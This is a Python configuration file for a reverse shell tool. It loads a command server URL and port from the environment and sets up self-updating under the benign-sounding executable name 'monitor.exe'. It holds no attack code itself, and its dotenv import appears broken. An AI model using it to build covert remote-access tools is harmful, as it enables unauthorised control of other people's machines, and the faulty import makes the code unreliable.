"""
This module contains the config for the reverse shell.
"""

# 1st party imports
import os

# 3rd party imports
from python_dotenv import load_dotenv

# load the environment variables
load_dotenv()

# NOTE: Before building the file make sure that all the variables are populated
SERVER_URL = os.getenv("SERVER_URL")
SERVER_PORT = int(os.getenv("SERVER_PORT", 8080))

# version manager config
# TODO: Fix after the first commit
RAW_VERSION_URL = ""
EXE_ASSET_URL = ""
EXE_NAME = "monitor.exe"
VERSION_FILE = "version.txt"
HTTP_TIMEOUT = 15

# check if all the variables are populated
req_vars = [SERVER_URL, SERVER_PORT]
if not all(req_vars):
    raise ValueError("All required variables are not set. Please check the .env file.")